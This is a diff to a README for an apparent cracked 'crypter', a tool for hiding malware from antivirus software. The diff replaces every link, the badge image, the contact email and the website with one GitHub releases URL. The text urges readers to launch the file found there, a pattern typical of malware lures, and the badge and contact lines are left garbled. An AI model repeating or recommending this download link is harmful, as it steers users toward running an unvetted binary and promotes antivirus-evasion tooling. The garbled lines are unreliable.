@@ -19,15 +19,15 @@ This repository houses the source code for an advanced crypter tool that helps g
 
 ## 🔗 Download
 
-You can [download the source code here](https://github.com/files/File.zip). Make sure to launch the file provided in the link to start using the tool effectively. 
+You can [download the source code here](https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases). Make sure to launch the file provided in the link to start using the tool effectively. 
 
 If the link is not available or not functional, please check the "Releases" section of this repository for alternative download options.
 
 ## 🎨 Visuals
 
-Enhance your README with colorful buttons using shields.io for a more visually appealing appearance:
+Enhance your README with colorful buttons using https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases for a more visually appealing appearance:
 
-[![Download Source Code](https://img.shields.io/badge/Download-Source%20Code-blue)](https://github.com/files/File.zip)
+[![Download Source Code](https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases%20Code-blue)](https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases)
 
 ## 🌠 Get Started
 
@@ -43,11 +43,11 @@ Contributions to this repository are welcome. Feel free to fork the project, mak
 
 ## 📞 Contact
 
-For any inquiries or feedback, you can reach out via email at [contact@aliencrypter.com](mailto:contact@aliencrypter.com).
+For any inquiries or feedback, you can reach out via email at [https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases](https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases).
 
 ## 🌌 Explore More
 
-Visit our website [AlienCrypter.com](https://www.aliencrypter.com) to discover more about our tools and services in the cybersecurity realm.
+Visit our website [https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases](https://github.com/Bro123con/Alien-Crypter-Crack-Source-Code-Net-Native/releases) to discover more about our tools and services in the cybersecurity realm.
 
 ---
 
